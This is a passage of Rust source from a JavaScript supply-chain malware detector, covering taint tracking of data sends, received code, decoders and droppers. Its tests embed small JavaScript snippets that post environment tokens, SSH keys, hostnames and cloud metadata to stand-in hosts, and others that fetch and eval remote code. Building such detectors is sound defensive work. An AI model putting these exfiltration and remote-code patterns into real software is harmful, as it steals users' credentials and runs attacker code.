                .any(|n| is_one(n, &["child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec"]));
            if !(shell && self.sc_fixed_program(node, scope)) {
                self.sc_sink(r.cat, &v, at);
            }
        }
        // a WebAssembly module compiled or instantiated: not the bytes it was
        // made of (es-module-lexer's, decoded from base64, runs no code)
        if names.iter().any(|n| is_web_assembly(n)) {
            return Ok(V::empty());
        }
        // a file written, then run: what is written where, a run of it
        if let Some(file) = self.sc_file_write(node, member, name.as_deref(), recv, args, scope) {
            return Ok(file);
        }
        self.sc_file_run(node, &names, member, name.as_deref(), args, scope);
        // a binary read: the file's bytes (its callbacks get them)
        if let Some(bytes) = self.sc_binary_read(node, name.as_deref(), scope) {
            let src = self.sc_source_call(node, &names, args, scope).unwrap_or_else(V::empty).union(&bytes);
            let cb = self.sc_callbacks(node, &src, scope);
            return Ok(src.union(&cb.plain()));
        }
        // a read of local data: its value, and its callbacks get it
        if let Some(src) = self.sc_source_call(node, &names, args, scope) {
            let cb = self.sc_callbacks(node, &src, scope);
            return Ok(src.union(&cb.plain()));
        }
        // sends
        let mut spec = send_spec(&names);
        if spec.is_none() && callee_val.kind & OBJ_CLIENT != 0 && !member {
            spec = Some(SEND1);
        }
        if spec.is_none() && member && recv.kind & OBJ_CLIENT != 0 {
            if named("post") || named("put") || named("patch") {
                spec = Some(SEND1);
            } else if named("request") {
                spec = Some(REQUEST2);
            } else if named("get") {
                spec = Some(ADDRESS);
            }
        }
        if spec.is_none() && member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_WRITES)) {
            spec = Some(OPTIONS);
        }
        if spec.is_none() && name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) {
            // a network program run with data on its command line
            let sup = self.sup();
            let a = self.a();
            let list = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (list.first(), list.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if sup.p().re("_LD_NET_PROGRAM_RE").search(text).is_some() {
                    spec = Some(OPTIONS);
                }
            }
        }
        if let Some(spec) = spec {
            self.sc_send(node, spec, args, spread, scope);
        }
        // what the call receives (a response, a connection's data, what a
        // server is sent): its value, and what its callbacks are given
        // (from the script's own address: what a library requests for its
        // caller is not the script's download)
        let receiving = receives(&names)
            || (member && recv.kind & OBJ_CLIENT != 0 && name.as_deref().is_some_and(|n| is_one(n, CLIENT_CALLS)))
            || (!member && callee_val.kind & OBJ_CLIENT != 0);
        let got = if receiving && self.sc_own_address(node, &names, member, args, scope) {
            let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
            let what = names.first().cloned().unwrap_or_else(|| u("a request"));
            self.sc_source(K_RECEIVED, what, at, line, 0)
        } else {
            V::empty()
        };
        // the script's own wrapper of exec: its parameter is the command line
        if name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) && self.sc_command_line(node).is_none() {
            if let Some(first) = args.first() {
                if !first.params.is_empty() {
                    let at = self.a().0.nodes[node as usize].start;
                    let label = Rc::new(self.p.fns[self.fid as usize].label());
                    let entry: Entry = (self.m, at, label, false);
                    for &key in first.params.iter() {
                        self.reach_adds.push((key, EXEC_CMD, entry.clone()));
                    }
                }
            }
        }
        // `src.pipe(connection)`: what the stream holds is sent
        if member && named("pipe") && args.iter().any(|a| a.kind & OBJ_CONN != 0) {
            let at = self.a().0.nodes[node as usize].start;
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(&recv.plain(), SEND_DATA, at, &label);
        }
        // a selection of the environment's variables (`Object.entries(process.env)
        // .filter(([k]) => k.startsWith('X_'))`) is not the whole of it, unless
        // the test excludes some or names secrets (the text follower's _LD_ENV_SELECT_RE)
        if member && named("filter") && recv.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
            let first = self.a().list(node, jt::B).first().copied();
            if let Some(f) = first {
                if self.sc_selects(f) {
                    return Ok(V::empty());
                }
            }
        }
        // a number or a flag: not the data; a child process: not what it
        // was given (what it prints is local data only for a command known
        // to print some: sc_source_call)
        if names.iter().any(|n| is_one(n, NUMERIC)) || (member && named("byteLength")) {
            return Ok(V::empty());
        }
        let child = names.iter().any(|n| {
            n.len() > 14 && eq(&n[..14], "child_process.")
        }) || name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES) || is_one(n, &["spawn", "fork"]));
        if child {
            // a download's output is received: its value, and what its
            // callbacks are given (after its command line is read as a send)
            if name.as_deref().is_some_and(|n| is_one(n, EXEC_NAMES)) && self.sc_download(node) {
                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
                let src = self.sc_source(K_RECEIVED, u("a download"), at, line, 0);
                let cb = self.sc_callbacks(node, &src, scope);
                self.sc_runner_args(node, &src, scope);
                return Ok(src.union(&cb.plain()));
            }
            // (its callbacks still run: an exec's callback gets nothing local)
            let tg = self.p.call_targets(self.m, node, scope);
            if !tg.0.is_empty() {
                let line = self.call_line(node);
                return Ok(self.apply(node, &tg.0.clone(), args, spread, line, false));
            }
            return Ok(V::empty());
        }
        // the functions it reaches, as in project mode
        let tg = self.p.call_targets(self.m, node, scope);
        let (fids, how) = (tg.0.clone(), tg.1);
        let definite = how == descs::How::Definite;
        let line = self.call_line(node);
        let mut v;
        if !fids.is_empty() {
            v = self.apply(node, &fids, args, spread, line, false);
            if !definite {
                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                v = v.union(&union_all(&plains)).union(&recv.plain());
            }
            // (an instance of a class made in several places is a container:
            // what its methods are given it holds, what it holds they give back)
            if member && self.sc_instance_call(callee, &fids) {
                let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                let given = union_all(&plains);
                v = v.union(&given).union(&recv.plain());
                self.member_write(callee, &given, scope);
            }
        } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
            v = V::empty();
        } else if receiving {
            // (a response holds what was received, not what was sent)
            v = V::empty();
        } else {
            let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
            v = union_all(&plains).union(&recv.plain());
            if !member {
                v = v.union(&callee_val.plain());
            } else if named("join") || named("concat") {
                v = v.with_built();
            }
        }
        // (a server holds nothing it is sent, nor what its handler returns: OBJ_SERVER, below)
        let server = receiving && makes_server(&names);
        // callbacks of anything but the script's functions get what the call
        // holds, and what it receives (a request's callbacks, only that)
        if fids.is_empty() {
            let mut held = if receiving { got.clone() } else { recv.plain() };
            for a in args.iter().filter(|_| !receiving) {
                held = held.union(&a.plain());
            }
            // (what a server the script made is sent: its events' arguments; an
            // event named by anything but a literal may be one of them)
            let data_event = || -> bool {
                let a = self.a();
                match a.list(node, jt::B).first() {
                    Some(&e) if a.is_string(e) => a.str_value(e).is_some_and(|v| is_one(v, SERVER_DATA_EVENTS)),
                    _ => true,
                }
            };
            if member
                && recv.kind & OBJ_SERVER != 0
                && name.as_deref().is_some_and(|n| is_one(n, SERVER_EVENTS))
                && data_event()
            {
                let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
                held = held.union(&self.sc_source(K_RECEIVED, u("a server"), at, line, 0));
            }
            let cb = self.sc_callbacks(node, &held, scope);
            if !server {
                v = v.union(&cb.plain());
            }
            // a runner given as the callback runs it: `.then(eval)`
            if held.tainted() {
                self.sc_runner_args(node, &held, scope);
            }
        }
        if !server {
            v = v.union(&got);
        }
        // a container a value is put into holds it: an array's push, unshift and a splice's items, a Map's, a
        // Headers' or a URLSearchParams' set, a Set's add, a FormData's, a URLSearchParams' or a Headers' append, a
        // fill; and the target of `Object.assign(target, …)`, `Object.defineProperty`, `Reflect.set`. (D-3: the tree
        // knew an array's push and unshift alone, so `fd.append('e', env)` sent nothing.) A container a name holds:
        // a member's (`o.list.push(x)`, `this.items.push(x)`) is not followed, as before, since put into the object
        // that holds it, it joined unrelated flows in large bundles (vite's, monaco-editor's loader: two of the
        // popular set's releases SUSPICIOUS when it was)
        if member && name.as_deref().is_some_and(|n| is_one(n, COLLECTS)) {
            let from = if named("splice") { 2 } else { 0 };
            let plains: Vec<V> = args.iter().skip(from).map(|a| a.plain()).collect();
            let obj = self.a().unwrap(self.a().at(callee, jt::A));
            self.sc_put_into(obj, union_all(&plains), scope);
        }
        if names.iter().any(|n| is_one(n, PUTS_INTO_FIRST)) {
            if let Some(&target) = self.a().list(node, jt::B).first() {
                let plains: Vec<V> = args.iter().skip(1).map(|a| a.plain()).collect();
                let target = self.a().unwrap(target);
                self.sc_put_into(target, union_all(&plains), scope);
            }
        }
        // a decoder: what it returns is data the script decodes (`atob(x)`,
        // `Buffer.from(x, 'base64')`, a decryption, zlib's decompressions)
        if self.sc_is_decoder(node, &names, member, name.as_deref()) {
            let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
            let what = names.first().cloned().unwrap_or_else(|| u("a decoder"));
            v = v.union(&self.sc_decoded(what, at, line));
        }
        // what the call makes: a connection, a client; a connection's own
        // methods give it back
        let mut mark = 0u8;
        if makes_connection(&names) || (member && (named("request") || named("connect") || named("createConnection"))) {
            mark |= OBJ_CONN;
        }
        if makes_client(&names) {
            mark |= OBJ_CLIENT;
        }
        if server {
            mark |= OBJ_SERVER;
        }
        if member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_CHAIN)) {
            mark |= OBJ_CONN;
        }
        if mark != 0 {
            v = V { kind: v.kind | mark, ..v };
        }
        // bytes carved out of a binary read: `buf.subarray(offset)`
        if member {
            if let Some(c) = self.sc_carved(node, recv, name.as_deref()) {
                v = v.union(&c);
            }
        }
        Ok(v)
    }

    /// supply mode: `v` put into `obj` (a container's receiver, an `Object.assign` target) when it is a name: its
    /// binding holds it (not an import's).
    fn sc_put_into(&mut self, obj: NodeId, v: V, scope: ScopeId) {
        if self.a().kind(obj) == Kind::Identifier {
            if let Some(b) = self.bind(obj, scope) {
                if self.p.binds[b as usize].kind != BindKind::Import {
                    self.write(b, v, false);
                }
            }
        }
    }

    /// Is the call a decoder: `atob`, zlib's synchronous decompressions, a
    /// method named `decrypt`, `Buffer.from(x, 'base64' | 'base64url' | 'hex')`?
    fn sc_is_decoder(&self, node: NodeId, names: &[PyStr], member: bool, name: Option<&[u32]>) -> bool {
        if names.iter().any(|n| is_one(n, DECODERS)) || (member && name.is_some_and(|n| eq(n, "decrypt"))) {
            return true;
        }
        if names.iter().any(|n| eq(n, "Buffer.from")) {
            let list = self.a().list(node, jt::B);
            if let Some(enc) = list.get(1).and_then(|&e| self.sc_const_str(e)) {
                return is_one(&enc, &["base64", "base64url", "hex"]);
            }
        }
        false
    }

    /// supply mode: `new X(…)`: a connection (a socket, an XMLHttpRequest,
    /// a WebSocket), a Request (a send).
    pub(super) fn sc_new(&mut self, node: NodeId, args: &[V], spread: isize, scope: ScopeId) -> V {
        let callee = self.a().at(node, jt::A);
        let names = self.sc_names(callee, scope);
        let simple: Option<PyStr> = {
            let a = self.a();
            if a.is_ident(callee) {
                Some(a.name(callee).to_vec())
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee)
            } else {
                None
            }
        };
        let is_named = |n: &str| simple.as_deref().is_some_and(|x| eq(x, n)) || names.iter().any(|x| eq(last_part(x), n));
        if is_named("Request") {
            self.sc_send(node, SEND1, args, spread, scope);
        }
        // received code: new Function(…, code), new Function.constructor(…),
        // new vm.Script(code)
        let at = self.a().0.nodes[node as usize].start;
        let ctor = {
            let a = self.a();
            a.kind(callee) == Kind::MemberExpression && a.prop_name(callee).is_some_and(|n| eq(&n, "constructor")) && {
                let obj = a.at(callee, jt::A);
                (a.kind(obj) == Kind::Identifier && is_one(a.name(obj), CONSTRUCTORS))
                    || (a.kind(obj) == Kind::MemberExpression && a.prop_name(obj).is_some_and(|n| eq(&n, "constructor")))
            }
        };
        if ctor || names.iter().any(|n| eq(n, "Function")) {
            self.sc_sink(RUN_CODE, &union_all(args), at);
        } else if names.iter().any(|n| is_one(n, &["vm.Script", "vm.SourceTextModule"])) {
            let v = if spread == 0 { union_all(args) } else { args.first().cloned().unwrap_or_else(V::empty) };
            self.sc_sink(RUN_CODE, &v, at);
        }
        // (a WebAssembly module or instance: not the bytes it was made of)
        if names.iter().any(|n| is_web_assembly(n)) {
            return V::empty();
        }
        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
        let mut v = union_all(&plains);
        if is_named("Socket") || is_named("XMLHttpRequest") || is_named("WebSocket") || is_named("EventSource") {
            v = V { kind: v.kind | OBJ_CONN, ..v };
            // (what a socket, or a WebSocket or an event source the script
            // addresses, is sent is received; a browser's XMLHttpRequest is a
            // library's loader as often as not: jQuery's, CoffeeScript's)
            let own = if is_named("Socket") {
                true
            } else if is_named("WebSocket") || is_named("EventSource") {
                let first = self.a().list(node, jt::B).first().copied();
                match (first, args.first()) {
                    (Some(n), Some(a)) => (a.src && a.params.is_empty()) || !self.sc_from_caller(n, scope, 0),
                    _ => false,
                }
            } else {
                false
            };
            if own {
                let what = simple.clone().unwrap_or_else(|| u("a connection"));
                v = v.union(&self.sc_source(K_RECEIVED, what, at, self.a().line(node), 0));
            }
        }
        v
    }
}

// ---------------------------------------------------------------- the answer --

/// What the tree says about a text: the first send of local data (offset,
/// kind, what, whether only an address held it), none, or that it could
/// not say (the text follower answers).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Answer {
    Found(usize, &'static str, PyStr, bool),
    Nothing,
    Unread,
}

/// The names that hold a path outside the package (core's `outside`, read
/// from the assignments of the module's bindings instead of a pattern for
/// assignments).
fn outside_names(prog: &Program, sup: &Supply) -> HashSet<PyStr> {
    let p = sup.p();
    let path_expr = p.re("_LD_PATH_EXPR_RE");
    let own_folder = p.re("_LD_OWN_FOLDER_RE");
    let fs_root = p.re("_LD_FS_ROOT_RE");
    let home = p.re("_LD_HOME_RE");
    let mut values: Vec<(PyStr, u32, u32)> = Vec::new();
    for b in &prog.binds {
        for w in &b.writes {
            if let Write::Init { node, path, .. } | Write::Assign { node, path, .. } = w {
                if path.is_empty() && b.module == 0 {
                    let n = &prog.mods[0].tree.nodes[*node as usize];
                    values.push((b.name.clone(), n.start, n.end));
                }
            }
        }
    }
    let mut outside: HashSet<PyStr> = HashSet::new();
    for (name, lo, hi) in &values {
        let value = pystr::strip(sup.span(*lo, *hi));
        if path_expr.match_(value).is_some()
            && own_folder.search(value).is_none()
            && (fs_root.match_(value).is_some() || home.search(value).is_some())
        {
            outside.insert(name.clone());
        }
    }
    for _ in 0..p.usize("_DD_PASSES") {
        if outside.is_empty() {
            break;
        }
        let mut grown = false;
        for (name, lo, hi) in &values {
            if outside.contains(name) {
                continue;
            }
            let value = sup.span(*lo, *hi);
            if path_expr.match_(pystr::lstrip(value)).is_some() && own_folder.search(value).is_none() {
                let uses = p.re("_LD_NAME_TOKEN_RE").finditer(value).any(|m| outside.contains(m.group0()));
                if uses {
                    outside.insert(name.clone());
                    grown = true;
                }
            }
        }
        if !grown {
            break;
        }
    }
    outside
}

/// What the tree says about a JavaScript text: its send of local data (the
/// strongest, `Found`, or `Nothing`), and its first received code (the
/// 1-based line and the category), if any.
#[derive(Clone, Debug)]
pub struct Facts {
    pub sent: Answer,
    pub received: Option<(usize, &'static str)>,
    /// code the script decodes, run: (the run's offset, the decoding's), in
    /// the text's order
    pub decoded: Vec<(usize, usize)>,
    /// the first file the script writes, then runs, holding code or a
    /// program it decodes, carves out of another file or downloads
    pub dropped: Option<DropRun>,
}

thread_local! {
    /// The last text read and what the tree said (None: it could not say):
    /// the tests ask for a text's send, then for its received code.
    static LAST: std::cell::RefCell<Option<(Vec<u32>, Option<Rc<Facts>>)>> = const { std::cell::RefCell::new(None) };
}

/// The tree's facts about a JavaScript text, or None when it could not say
/// (a text the parser doesn't read, over 2 MB, or past the pass's budget):
/// the text followers answer then.
pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
    if text.len() > MAX_FILE {
        return None;
    }
    if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
        return hit;
    }
    let owned = text.to_vec();
    let got = crate::api::on_own_stack(move || facts_here(&owned)).map(Rc::new);
    LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
    got
}

/// The strongest send of local data in a JavaScript text, read on its tree.
pub fn local_data_sent(text: &[u32]) -> Answer {
    match facts(text) {
        Some(f) => f.sent.clone(),
        None => Answer::Unread,
    }
}

/// The first received code in a JavaScript text, read on its tree: Some(the
/// line and category, or None), or None when the tree could not say.
pub fn received_code(text: &[u32]) -> Option<Option<(usize, &'static str)>> {
    facts(text).map(|f| f.received)
}

/// Code a JavaScript text decodes and runs, read on its tree: Some((the
/// run's offset, the decoding's) for each), or None when the tree could not
/// say.
pub fn decoded_runs(text: &[u32]) -> Option<Vec<(usize, usize)>> {
    facts(text).map(|f| f.decoded.clone())
}

/// A file a JavaScript text writes, then runs (a dropper's), read on its
/// tree: Some(the first, or None), or None when the tree could not say.
pub fn dropped_run(text: &[u32]) -> Option<Option<DropRun>> {
    facts(text).map(|f| f.dropped.clone())
}

fn facts_here(text: &[u32]) -> Option<Facts> {
    let pack = crate::pack::current();
    let path = u("script.js");
    let tree = match crate::jsparse::parse_file(&path, text) {
        Ok(t) => t,
        // (TypeScript, which the hosts hand as JavaScript)
        Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
            Ok(t) => t,
            Err(_) => return None,
        },
    };
    let sup = Rc::new(Supply::new(pack, text));
    let mut cfg = Config::new(&[], &[], &[], &[]);
    cfg.supply = Some(sup.clone());
    let mut prog = Program::new(Rc::new(cfg));
    prog.add_module(&path, tree, 0);
    prog.resolve_module(0);
    let outside = outside_names(&prog, &sup);
    *sup.outside.borrow_mut() = outside;
    let mut findings: Vec<Out> = Vec::new();
    let notes = fixpoint(&mut prog, &mut findings);
    if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
        return None;
    }
    // the strongest send: data over what only an address holds, a harvest
    // over other data, then the first; the first received code
    let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
    let mut first: Option<(u32, &'static str)> = None;
    let mut decoded: Vec<(usize, usize)> = Vec::new();
    let dropped = first_drop(text, &findings);
    for f in findings {
        match f {
            Out::Send { at, kind, what, in_address: weak } => {
                let rank = (weak, weak || !harvest_of(sup.p(), kind, &what, &sup.whole), at);
                if best.as_ref().map_or(true, |(r, _, _)| rank < *r) {
                    best = Some((rank, kind, what));
                }
            }
            Out::Received { at, cat } => {
                if first.map_or(true, |(a, _)| at < a) {
                    first = Some((at, cat));
                }
            }
            Out::Decoded { at, from } => decoded.push((at as usize, from as usize)),
            _ => {}
        }
    }
    decoded.sort_unstable();
    decoded.dedup_by_key(|d| d.0);
    let sent = match best {
        Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
        None => Answer::Nothing,
    };
    let received = first.map(|(at, cat)| {
        let at = (at as usize).min(text.len());
        (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
    });
    Some(Facts { sent, received, decoded, dropped })
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOST: &str = "collect.invalid";

    fn sent(src: &str) -> Option<(&'static str, String, bool)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match facts_here(&text).map(|f| f.sent) {
            Some(Answer::Found(_at, kind, what, in_address)) => {
                Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
            }
            Some(_) => None,
            None => panic!("not read: {}", src),
        }
    }

    fn found(kind: &'static str, what: &str) -> Option<(&'static str, String, bool)> {
        Some((kind, what.to_string(), false))
    }

    /// The category of a text's first received code, if any.
    fn runs(src: &str) -> Option<&'static str> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match facts_here(&text) {
            Some(f) => f.received.map(|(_, cat)| cat),
            None => panic!("not read: {}", src),
        }
    }

    #[test]
    fn the_environment_by_variable_and_whole() {
        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", post)), found("environment", "NPM_TOKEN"));
        assert_eq!(sent(&format!("const v = JSON.stringify(process.env);\n{}", post)), found("environment", "the whole environment"));
        assert_eq!(sent(&format!("const v = {{ ...process.env }};\n{}", post)), found("environment", "the whole environment"));
        // a name read through destructuring is that variable
        assert_eq!(sent(&format!("const {{ USER: v }} = process.env;\n{}", post)), found("identity", "USER"));
        // a variable no client keeps secret is not local data
        assert_eq!(sent(&format!("const v = process.env.NODE_ENV;\n{}", post)), None);
        // a variable only in the address a client sends its key to
        assert_eq!(
            sent(&format!("fetch('https://{}/?k=' + process.env.API_KEY);\n", HOST)),
            Some(("environment", "API_KEY".to_string(), true))
        );
        // a local object named process is not the environment
        assert_eq!(sent(&format!("const process = {{ env: {{ TOKEN: 'x' }} }};\nconst v = process.env.TOKEN;\n{}", post)), None);
    }

    #[test]
    fn the_machine_through_functions_callbacks_and_closures() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the script's own function
        assert_eq!(
            sent(&format!("const os = require('os');\nfunction send(d) {{ {} }}\nsend(os.hostname());\n", post("d"))),
            found("identity", "hostname")
        );
        // an exec's callback writes a closure's variable, another callback sends it
        let src = format!(
            "const {{ exec }} = require('child_process');\nconst https = require('https');\nlet data = '';\n\
             exec('whoami', (e, out) => {{ data = out; }});\n\
             setTimeout(() => {{ https.request({{ hostname: '{}' }}).end(data); }}, 10);\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // a member of this
        let src = format!(
            "const os = require('os');\nclass C {{\n  constructor() {{ this.data = os.hostname(); }}\n  \
             send() {{ {} }}\n}}\nnew C().send();\n",
            post("this.data")
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a name no declaration binds
        assert_eq!(sent(&format!("data = require('os').hostname();\n{}", post("data"))), found("identity", "hostname"));
        // a function of the os module given as a value
        let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn containers_hold_what_they_are_given() {
        // D-3: the tree knew an array's push and unshift alone; what a Map, a Set or a FormData was given, or
        // Object.assign put into an object, was sent unseen
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        let env = found("environment", "the whole environment");
        for (fill, body) in [
            ("const c = [];\nc.push(process.env);\n", "JSON.stringify(c)"),
            ("const c = [];\nc.unshift(process.env);\n", "JSON.stringify(c)"),
            ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
            ("const c = new Array(1);\nc.fill(process.env);\n", "JSON.stringify(c)"),
            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify([...c])"),
            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(c.get('e'))"),
            ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
            ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
            ("const c = new URLSearchParams();\nc.set('e', JSON.stringify(process.env));\n", "c.toString()"),
            ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
            ("const c = {};\nObject.defineProperty(c, 'e', { value: process.env, enumerable: true });\n", "JSON.stringify(c)"),
            ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
        ] {
            assert_eq!(sent(&format!("{}{}", fill, post(body))), env, "{}", fill);
        }
        // a module's container, filled in a function and sent in another
        let src = format!(
            "const c = new Map();\nfunction keep() {{ c.set('e', process.env); }}\nkeep();\n{}",
            post("JSON.stringify([...c])")
        );
        assert_eq!(sent(&src), env);
        // one variable in a header
        let src = format!(
            "const h = new Headers();\nh.set('authorization', process.env.NPM_TOKEN);\n\
             fetch('https://{}/c', {{ method: 'POST', headers: h }});\n",
            HOST
        );
        assert_eq!(sent(&src), found("environment", "NPM_TOKEN"));
        // what a container holds that nothing sends, and what an import is given, are not sent
        assert_eq!(sent(&format!("const c = new Map();\nc.set('e', process.env);\n{}", post("'ok'"))), None);
        assert_eq!(sent(&format!("import c from 'store';\nc.set('e', process.env);\n{}", post("JSON.stringify(c)"))), None);
        // code received into a Map, then run
        let src = "const https = require('https');\nhttps.get('https://x.invalid/c', (r) => {\n  const m = new Map();\n  \
                   let b = '';\n  r.on('data', (d) => { b += d; });\n  r.on('end', () => { m.set('c', b); eval(m.get('c')); });\n});\n";
        assert_eq!(runs(src), Some("run"));
    }

    #[test]
    fn modules_under_other_names() {
        let src = format!("import os from 'os';\nimport axios from 'axios';\naxios.post('https://{}/c', {{ h: os.hostname() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // require kept under another name (model-providers 99.3.9's form)
        let src = format!(
            "const _req = module.require;\nconst os = _req('os');\nfetch('https://{}/c', {{ method: 'POST', body: os.hostname() }});\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        let src = format!("const r = require;\nconst o = r('os');\nfetch('https://{}/c', {{ method: 'POST', body: o.userInfo() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "userInfo"));
    }

    #[test]
    fn the_scripts_own_wrappers() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // of exec, given a command line
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n{}",
            post("run('whoami')")
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // of a read, given a folder outside the package (elf-stats' form)
        let src = format!(
            "const fs = require('fs');\nfunction dump(dir) {{ return fs.readdirSync(dir).map((f) => fs.readFileSync(dir + '/' + f, 'utf8')); }}\n{}",
            post("JSON.stringify(dump('/etc'))")
        );
        assert_eq!(sent(&src), found("file", "/etc"));
        // of the environment, given a name
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('AWS_SECRET_ACCESS_KEY')"));
        assert_eq!(sent(&src), found("environment", "AWS_SECRET_ACCESS_KEY"));
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('HOST')"));
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn sends_by_what_makes_them() {
        // a connection, written in a callback
        let src = "const net = require('net');\nconst { execSync } = require('child_process');\nconst out = execSync('ps aux').toString();\n\
                   const c = net.connect(8058, '198.51.100.7', () => { c.write(out); });\n";
        assert_eq!(sent(src), found("report", "ps"));
        // a DNS lookup of a name composed with the data; not of the data alone
        let src = format!("const dns = require('dns');\nconst os = require('os');\ndns.resolve(os.hostname() + '.x.{}', () => {{}});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        assert_eq!(sent("const dns = require('dns');\nconst os = require('os');\ndns.lookup(os.hostname(), () => {});\n"), None);
        // a host name built from the data is resolved: sent, whatever is done with it
        let src = format!("const os = require('os');\nconst u = 'https://' + os.hostname() + '.{}';\nprobe(u);\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a path joined to a fixed host is not a host name
        assert_eq!(sent("const os = require('os');\nprobe('http://x.example' + os.homedir());\n"), None);
        // a child process doesn't hold what it was given; a length is not the data
        let src = "const net = require('net');\nconst { spawn } = require('child_process');\nconst s = net.connect(1, 'h');\n\
                   const c = spawn('x', [], { env: process.env });\nc.stdout.pipe(s);\n";
        assert_eq!(sent(src), None);
        let src = format!("fetch('https://{}/c', {{ headers: {{ 'Content-Length': Buffer.byteLength(JSON.stringify(process.env)) }} }});\n", HOST);
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn a_send_by_the_strongest_data_it_carries() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the instance's credentials after what whoami prints (psdimporter's form)
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n\
             const who = run('whoami');\nconst meta = run('curl -s http://169.254.169.254/latest/meta-data/');\n{}",
            post("`${who} ${meta}`")
        );
        assert_eq!(sent(&src), found("credentials", "the instance's metadata"));
        // a credential store after another file
        let src = format!(
            "const fs = require('fs');\nconst os = require('os');\nconst h = fs.readFileSync('/etc/hosts', 'utf8');\n\
             const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n{}",
            post("h + k")
        );
        assert_eq!(sent(&src), found("file", "os.homedir() + '/.ssh/id_rsa'"));
        // of two sends, the whole environment's after the host name's
        let src = format!("const os = require('os');\n{}{}", post("os.hostname()"), post("JSON.stringify(process.env)"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // otherwise the first read
        let src = format!("const fs = require('fs');\nconst os = require('os');\n{}", post("os.hostname() + fs.readFileSync('/etc/hosts')"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn code_it_receives_run_loaded_or_deserialized() {
        let url = format!("'https://{}/p.js'", HOST);
        // model-providers' form: require under another name, a response's
        // chunks gathered in a callback, Module's _compile
        let src = format!(
            "(() => {{\n  const _req = module.require;\n  const http = _req('http');\n  const Module = _req('module');\n\
             http.request({{ hostname: '{}', path: '/x.js' }}, res => {{\n    let code = '';\n\
             res.on('data', chunk => code += chunk);\n    res.on('end', () => {{\n      const m = new Module('x.js');\n\
             m._compile(code, 'x.js');\n    }});\n  }}).end();\n}})();\n",
            HOST
        );
        assert_eq!(runs(&src), Some("run"));
        // a response's text, through promises and the script's own runner
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(c => eval(c));\n", url)), Some("run"));
